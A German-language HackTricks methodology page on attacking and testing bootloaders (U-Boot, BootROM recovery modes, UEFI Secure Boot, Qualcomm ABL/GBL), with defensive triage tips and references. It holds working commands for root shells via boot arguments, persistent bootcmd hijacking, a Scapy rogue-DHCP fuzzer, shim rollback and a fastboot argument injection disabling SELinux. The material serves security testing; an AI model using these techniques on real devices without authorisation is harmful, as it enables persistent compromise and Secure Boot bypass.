# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Gerätestartkonfigurationen zu ändern und Bootloader wie U-Boot und UEFI-Klassen-Loader zu testen. Konzentriere dich darauf, frühzeitig Codeausführung zu erreichen, Signatur- und Rollback-Schutzmaßnahmen zu bewerten und Recovery- oder Netzwerk-Boot-Pfade auszunutzen.

Verwandtes Thema: Umgehung von MediaTek Secure Boot durch bl2_ext-Patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: schnelle Erfolge und Missbrauch der Umgebung

1. Zugriff auf die Interpreter-Shell
   - Drücke während des Bootvorgangs eine bekannte Abbruchtaste (häufig eine beliebige Taste, 0, die Leertaste oder eine boardspezifische „Magic“-Tastenkombination), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.<sup>[[1]](#references)</sup>

2. Bootstatus und Variablen untersuchen
   - Nützliche Befehle:
     - `printenv` (Umgebung ausgeben)
     - `bdinfo` (Board-Informationen, Speicheradressen)
     - `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
     - `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Boot-Argumente ändern, um eine Root-Shell zu erhalten
   - Hänge `init=/bin/sh` an, damit der Kernel eine Shell statt des normalen Init-Prozesses startet:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot von deinem TFTP-Server
   - Netzwerk konfigurieren und ein Kernel-/FIT-Image aus dem LAN abrufen:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Änderungen über die Umgebung persistieren
   - Wenn der env-Speicher nicht schreibgeschützt ist, kannst du die Kontrolle persistieren:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Einstiege in die Shell ermöglichen.

6. Debug-/unsichere Funktionen prüfen
   - Achte auf: `bootdelay` > 0, deaktiviertes `autoboot`, uneingeschränktes `usb start; fatload usb 0:1 ...`, die Möglichkeit, über die serielle Schnittstelle `loady`/`loads` auszuführen, `env import` von nicht vertrauenswürdigen Medien sowie Kernel/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot-Image-/Verifizierungsprüfung
   - Wenn die Plattform Secure Boot/Verified Boot mit FIT-Images verspricht, teste sowohl unsignierte als auch manipulierte Images:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder das Verhalten des älteren `verify=n` ermöglicht oft das Booten beliebiger Payloads.
   - Beschränke dich nicht auf ein einfaches Erlauben/Verweigern-Ergebnis: Aktuelle FIT-Forschung hat gezeigt, dass der Verifizierungspfad selbst eine Pre-Auth-Angriffsfläche sein kann. Teste extern gespeicherte FIT-Daten (`data-offset`, `data-position`, `data-size`), die Auswahl signierter Konfigurationen, `loadables` sowie die Verarbeitung von Overlays und `extra-conf` mit Negativtests.
   - Wenn du einen passenden Source-Tree hast, lässt sich das FIT-Verifizierungsverhalten mit `test/vboot/vboot_test.sh` schnell in der U-Boot-Sandbox reproduzieren, bevor du echte Hardware testest.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` und Script-Bootflows
   - Bei modernen U-Boot-Builds ist `bootcmd` oft nur ein Wrapper um Standard Boot. Dadurch können beschreibbare Medien, PXE oder SPI-Flash die eigentliche Vertrauensgrenze bilden, selbst wenn die sichtbare Umgebung harmlos aussieht.
   - Die `extlinux`-Bootmeth sucht unter `/` und `/boot` nach `extlinux/extlinux.conf`; die Script-Bootmeth sucht zuerst nach `boot.scr.uimg` und dann nach `boot.scr`. Beim Netzwerk-Boot kann der Script-Dateiname aus `boot_script_dhcp` stammen.
   - Nützliche Befehle zur ersten Prüfung:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Zu testende Missbrauchsszenarien: vom Angreifer kontrollierte USB-/SD-Medien, die in `boot_targets` früher aufgeführt sind, eine beschreibbare `/boot/extlinux/extlinux.conf`, ein rogue TFTP-Server, der `boot.scr` bereitstellt, oder eine skriptbasierte Ausführung über SPI mithilfe von `script_offset_f`.
   - Wenn die Plattform auf FIT-Verifizierung setzt, sicherstellen, dass Konfigurationen auf Konfigurationsebene signiert sind und nicht nur pro Image; `required-mode=all` ist sicherer, als einen beliebigen einzelnen erforderlichen Schlüssel zu akzeptieren.

## Netzwerk-Boot-Angriffsfläche (DHCP/PXE) und rogue Server

9. Fuzzing von PXE-/DHCP-Parametern
   - U-Boots veraltete BOOTP-/DHCP-Verarbeitung hatte bereits Probleme mit der Speichersicherheit. CVE‑2024‑42040 beschreibt beispielsweise eine Offenlegung von Speicherinhalten über manipulierte DHCP-Antworten, durch die Bytes aus dem U-Boot-Speicher über das Netzwerk geleakt werden können.<sup>[[4]](#references)</sup> Die DHCP-/PXE-Codepfade mit überlangen Werten und Randfällen testen (Option 67 `bootfile-name`, Herstelleroptionen sowie `file`- und `servername`-Felder) und auf Hänger/Leaks achten.
   - Minimales Scapy-Snippet, um Boot-Parameter während des Netbootings zu testen:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Überprüfen Sie außerdem, ob PXE-Dateinamenfelder ohne Bereinigung an Shell-/Loader-Logik übergeben werden, wenn sie mit OS-seitigen Provisioning-Scripts verkettet werden.

10. Tests auf command injection über rogue DHCP-Server
   - Richten Sie einen rogue DHCP-/PXE-Dienst ein und versuchen Sie, Zeichen in Datei- oder Optionsfelder einzuschleusen, um in späteren Phasen der Boot-Kette Kommandozeileninterpreter zu erreichen. Metasploits DHCP auxiliary, `dnsmasq` oder benutzerdefinierte Scapy-Scripts eignen sich gut. Isolieren Sie zuerst das Labornetzwerk.

## SoC-ROM-Recovery-Modi, die den normalen Bootvorgang außer Kraft setzen

Viele SoCs bieten einen BootROM-„Loader“-Modus, der Code über USB/UART akzeptiert, selbst wenn die Flash-Images ungültig sind. Wenn die Secure-Boot-Fuses nicht durchgebrannt sind, kann dies sehr früh in der Boot-Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
  - Beispiel: `imx-usb-loader u-boot.imx`, um einen benutzerdefinierten U-Boot aus dem RAM zu laden und auszuführen.
- Allwinner (FEL)
  - Tool: `sunxi-fel`.
  - Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`.
  - Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader bereitzustellen und einen benutzerdefinierten U-Boot hochzuladen.

Prüfen Sie, ob die Secure-Boot-eFuses/OTP des Geräts durchgebrannt sind. Andernfalls umgehen BootROM-Download-Modi häufig jede höherstufige Verifikation (U-Boot, Kernel, Rootfs), indem sie Ihr First-Stage-Payload direkt aus SRAM/DRAM ausführen.

## UEFI-/PC-Bootloader: Schnellprüfungen

11. Tests auf ESP-Manipulation, Rollback und Schlüsselregistrierung
   - Mounten Sie die EFI System Partition (ESP) und prüfen Sie auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, Herstellerlogo-Pfade.
   - Dumpen Sie, wenn möglich, den Secure-Boot-Status und die Schlüsseldatenbanken aus dem OS:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Wenn sich die Plattform im Setup Mode befindet, eine nicht authentifizierte Schlüsselregistrierung zulässt oder mit einem Test-/Standard-Platform Key (PKfail-Klasse) ausgeliefert wird, kann ein lokaler Administrator oder ein Angreifer mit physischem Zugriff eigene KEK/db-Schlüssel registrieren und Secure Boot weiterhin als „aktiviert“ erscheinen lassen, während beliebige EFI-Binärdateien gestartet werden.<sup>[[3]](#references)</sup>
   - Versuche, mit herabgestuften oder bekanntermaßen verwundbaren, signierten Boot-Komponenten zu starten, wenn die Secure Boot-Widerrufsliste (dbx) nicht aktuell ist. Vertraut die Plattform weiterhin alten Shims/Bootmanagern, kannst du oft einen eigenen Kernel oder eine `grub.cfg` von der ESP laden, um Persistenz zu erlangen.
   - Unter Windows können gepatchte Hosts weiterhin verwundbare, signierte Bootmanager akzeptieren, wenn der Signierer `Microsoft Windows Production PCA 2011` in der Firmware-`dbx` fehlt, wie bei BlackX beobachtet wurde.<sup>[[13]](#references)[[14]](#references)</sup> Ein Umgehungsverfahren im Stil von Baton Drop kann einen Angreifer-MOK registrieren; ein legitimer Shim kann dann bei späteren Starts eine mit diesem Schlüssel signierte EFI-Payload laden.<sup>[[12]](#references)[[13]](#references)</sup> Der spätere Widerruf des alten Windows-Signierers entfernt den registrierten MOK nicht. Daher kann der Shim-basierte Pfad bestehen bleiben, wenn diesem Shim weiterhin vertraut wird.<sup>[[12]](#references)</sup>
   - Prüfe vor dem Testen dieses Rollback-Pfads auf einem autorisierten UEFI-System den **effektiven Firmware-Widerrufsstatus** und nicht nur den Windows-Updateverlauf.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft stellt diese schreibgeschützte PowerShell-Prüfung mit erhöhten Rechten für den 2011-Signierer in `dbx` bereit:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` ist lediglich ein Hinweis: Bestätige die konkrete signierte Boot-Komponente und weitere Widerrufsinformationen in einer wiederherstellbaren Laborumgebung.<sup>[[12]](#references)[[14]](#references)</sup> Ein ausstehendes Registry-Update oder ein abgelaufenes Signaturzertifikat ist nicht gleichbedeutend mit einem abgeschlossenen `dbx`-Widerruf.<sup>[[13]](#references)[[14]](#references)</sup>

12. Tests auf veraltete Shim- / SBAT- / dbx-Widerrufe
   - Alte, von Microsoft signierte Shims und Hersteller-Forks können bei veralteten Widerrufen weiterhin als BYOVD-artiger Bootkit-Pfad dienen. Lege in einer isolierten Laborumgebung einen historisch anfälligen Shim auf der ESP ab und versuche, dein eigenes `grubx64.efi` oder deinen Kernel per Chainload zu starten.<sup>[[11]](#references)</sup>
   - Schnelle Ersteinschätzung:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Wenn der shim trotz Eintrag in der Revocation List weiterhin ausgeführt wird, enthält die Firmware/das OS veraltete `dbx`-Updates oder vertraut einem geforkten Loader, der die upstream SBAT-Schutzmechanismen nie übernommen hat.

13. Fehler beim Parsen des Bootlogos (Klasse LogoFAIL)
   - Mehrere OEM-/IBV-Firmwares waren anfällig für Parsing-Fehler in DXE beim Verarbeiten von Bootlogos. Wenn ein Angreifer ein präpariertes Bild auf der ESP unter einem herstellerspezifischen Pfad (z. B. `\EFI\<vendor>\logo\*.bmp`) ablegen und das Gerät neu starten kann, ist möglicherweise Codeausführung während des frühen Bootvorgangs möglich, selbst wenn Secure Boot aktiviert ist. Prüfe, ob die Plattform vom Benutzer bereitgestellte Logos akzeptiert und ob diese Pfade vom OS aus beschreibbar sind.<sup>[[2]](#references)</sup>


## Vertrauenslücken bei Android/Qualcomm ABL + GBL (Android 16)

Prüfe bei Android-16-Geräten, die Qualcomm's ABL zum Laden der **Generic Bootloader Library (GBL)** verwenden, ob ABL die UEFI-App **authentifiziert**, die es von der `efisp`-Partition lädt. Prüft ABL lediglich, ob eine UEFI-App **vorhanden** ist, ohne Signaturen zu verifizieren, ermöglicht eine Schreibmöglichkeit auf `efisp` die **Ausführung unsignierten Codes vor dem OS** beim Booten.<sup>[[6]](#references)[[7]](#references)</sup>

Praktische Prüfungen und Angriffsmöglichkeiten:

- **Schreibmöglichkeit auf efisp**: Du benötigst eine Möglichkeit, eine benutzerdefinierte UEFI-App in `efisp` zu schreiben (Root/Zugriff eines privilegierten Dienstes, Fehler in einer OEM-App, Recovery-/Fastboot-Pfad). Ohne diese Möglichkeit ist die GBL-Ladelücke nicht direkt ausnutzbar.<sup>[[6]](#references)</sup>
- **fastboot-OEM-Argument-Injection** (ABL-Fehler): Manche Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen sie an die Kernel-cmdline an. Damit lässt sich SELinux in den permissive-Modus versetzen, wodurch Schreibzugriffe auf geschützte Partitionen möglich werden:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente zurückweisen.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-Entsperrung über persistente Flags**: Ein Payload in einer Boot-Phase kann persistente Entsperr-Flags (z. B. `is_unlocked=1`, `is_unlocked_critical=1`) umschalten, um `fastboot oem unlock` ohne OEM-Server- oder Genehmigungshürden nachzubilden. Dadurch ändert sich der Gerätestatus dauerhaft – auch nach dem nächsten Neustart.<sup>[[6]](#references)</sup>

Hinweise zu Abwehr und Triage:

- Prüfen, ob ABL die Signatur des GBL/UEFI-Payloads aus `efisp` verifiziert. Falls nicht, `efisp` als hochriskante Persistenzoberfläche behandeln.
- Nachverfolgen, ob die ABL-fastboot-OEM-Handler so gepatcht sind, dass sie **die Anzahl der Argumente validieren** und zusätzliche Tokens zurückweisen.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardwarehinweis

Vorsicht beim Zugriff auf SPI/NAND-Flash während des frühen Bootvorgangs (z. B. beim Erden von Pins, um Lesezugriffe zu umgehen) und immer das Flash-Datenblatt beachten. Falsch getimte Kurzschlüsse können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- `env export -t ${loadaddr}` und `env import -t ${loadaddr}` ausprobieren, um Umgebungsblobs zwischen RAM und Speicher zu verschieben; manche Plattformen erlauben den Import einer Umgebung von Wechselmedien ohne Authentifizierung.
- Bei Linux-basierten Systemen, die über `extlinux.conf` starten, reicht es oft, die `APPEND`-Zeile (zum Einschleusen von `init=/bin/sh` oder `rd.break`) auf der Bootpartition zu ändern, wenn keine Signaturprüfungen erzwungen werden.
- Bei Zielen mit Dual-Slot-/A/B-Updates die Anti-Rollback- und Slot-Desync-Techniken in der [Übersicht zur Firmware-Analyse](README.md) prüfen, damit keine Trust-Lücken übersehen werden, die nur den Updater und nicht den Bootloader selbst betreffen.
- Wenn die Userland-Tools `fw_printenv/fw_setenv` bereitstellt, prüfen, ob `/etc/fw_env.config` dem tatsächlichen Speicherort der Umgebung entspricht. Falsch konfigurierte Offsets ermöglichen das Lesen oder Schreiben im falschen MTD-Bereich.

## References

- [1] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL auf der Spur: Die Gefahren der Bildverarbeitung während des Systemstarts](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nicht vertrauenswürdige Plattformschlüssel untergraben Secure Boot im UEFI-Ökosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Details zu CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Xiaomi durch zwei nicht bereinigte Zeichenfolgen entsperren](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit für Qualcomm Snapdragon 8 Elite GBL ermöglicht Angreifern das Entsperren von Bootloadern](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektur des Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Weitergabe nicht vertrauenswürdiger Eingaben an die Kernel-Befehlszeile beheben](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Prüfung für den Befehl set-hw-fence-value hinzufügen](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: Die FIT-Signaturprüfung von U-Boot aushebeln](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Sicherheitshinweis VU#616257 – Von Microsoft signierte UEFI-shim-Bootloader sind anfällig für die Umgehung von Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus-UEFI-Bootkit: Mythos bestätigt](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: ein BlackLotus-ähnliches UEFI-Bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Windows Boot Manager-Sperrungen für Secure-Boot-Änderungen verwalten](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
